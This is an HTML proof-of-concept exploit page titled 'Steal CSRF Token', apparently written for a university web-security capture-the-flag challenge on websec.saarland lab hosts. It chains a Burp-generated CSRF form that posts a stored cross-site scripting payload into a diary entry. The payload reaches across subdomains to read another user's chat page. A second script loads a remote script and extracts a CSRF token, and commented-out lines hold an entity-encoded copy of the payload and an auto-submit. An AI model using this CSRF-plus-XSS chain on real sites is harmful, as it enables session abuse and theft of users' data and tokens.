<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Steal CSRF Token</title>
  </head>
  <body>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <script>
      // history.pushState("", "", "/");
      // document.domain = "owley-madison.jeopardy.websec.saarland";
    </script>
    <form
      action="https://diary.owley-madison.jeopardy.websec.saarland/entry"
      method="POST"
    >
      <input
        type="hidden"
        name="content"
        value='&lt;script&gt;
        document.domain = "owley-madison.jeopardy.websec.saarland";
        fetch("https://chat.owley-madison.jeopardy.websec.saarland/Sherrell")
          .then((response) =&gt; {
            if (!response.ok) {
              throw new Error(`HTTP error! status: ${response.status}`);
            }
            return response.text();
          })
          .then((data) =&gt; {
            alert(data);
          })
          .catch((error) =&gt; {
            alert(`Failed to fetch data: ${error.message}`);
          });
        &lt;/script&gt;
      '
      />
      <!-- <input type="hidden" name="csrfmiddlewaretoken" value="3lGdmYw7qFDwvTMOij4azwg70KXefwwfXXzLToNXceLC464hpgVCf5E4hc79ZKZG" /> -->
      <input type="submit" value="Submit request" />
    </form>
  </body>

  <script>
    // document.domain = "owley-madison.jeopardy.websec.saarland";
    var script = document.createElement("script");
    script.src =
      "https://owley-madison.jeopardy.websec.saarland/csrf_script.js";
    document.body.appendChild(script);

    // After the script is loaded and executed, extract the CSRF token
    script.onload = function () {
      // Access the CSRF token from the form on the page
      var csrfToken = document.forms[0].elements[2].value;
      // alert(csrfToken);

      console.log("Extracted CSRF Token:", csrfToken);
    };

    script.onerror = function () {
      console.error("Failed to load the CSRF script.");
    };

    // window.onload = function () {
    //   document.forms[0].submit();
    // };
  </script>
</html>

<!-- 
value="&lt;script&gt;&#13;&#10;fetch&#40;'https&#58;&#47;&#47;chat&#46;owley&#45;madison&#46;jeopardy&#46;websec&#46;saarland&#47;Sherrell'&#41;&#13;&#10;&#32;&#32;&#32;&#32;&#46;then&#40;response&#32;&#61;&gt;&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;if&#32;&#40;&#33;response&#46;ok&#41;&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;throw&#32;new&#32;Error&#40;&#96;HTTP&#32;error&#33;&#32;status&#58;&#32;&#36;&#123;response&#46;status&#125;&#96;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;return&#32;response&#46;text&#40;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#125;&#41;&#13;&#10;&#32;&#32;&#32;&#32;&#46;then&#40;data&#32;&#61;&gt;&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;alert&#40;data&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#125;&#41;&#13;&#10;&#32;&#32;&#32;&#32;&#46;catch&#40;error&#32;&#61;&gt;&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;alert&#40;&#96;Failed&#32;to&#32;fetch&#32;data&#58;&#32;&#36;&#123;error&#46;message&#125;&#96;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#125;&#41;&#59;&#13;&#10;&lt;&#47;script&gt;"
 -->

<!-- <script>
  document.domain = "owley-madison.jeopardy.websec.saarland";
  fetch("https://chat.owley-madison.jeopardy.websec.saarland/Sherrell")
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.text();
    })
    .then((data) => {
      alert(data);
    })
    .catch((error) => {
      alert(`Failed to fetch data: ${error.message}`);
    });
</script> -->
